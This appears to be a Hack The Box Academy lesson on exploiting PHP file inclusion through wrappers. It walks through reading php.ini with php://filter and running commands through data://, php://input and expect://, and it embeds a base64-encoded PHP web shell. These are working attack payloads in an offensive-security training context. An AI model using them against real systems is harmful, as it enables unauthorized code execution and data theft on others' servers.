<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/23/section/253
// Platform Version: V1
// Module ID: 23
// Module Name: File Inclusion
// Module Difficulty: Medium
// Section ID: 253
// Section Title: PHP Wrappers
// Page Title: Hack The Box - Academy
// Page Number: 5
-->

# PHP Wrappers

**Module Name:** File Inclusion **Page Number:** 5

#### 

#### FILE INCLUSION

# PHP Wrappers

## Data

#### Checking PHP Configurations

``` shell-session
ndefstathiou@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

``` shell-session
ndefstathiou@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

#### Remote Code Execution

``` shell-session
ndefstathiou@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

![https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

``` shell-session
ndefstathiou@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Input

``` shell-session
ndefstathiou@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Expect

``` shell-session
ndefstathiou@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

``` shell-session
ndefstathiou@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 

# 

#### Questions

####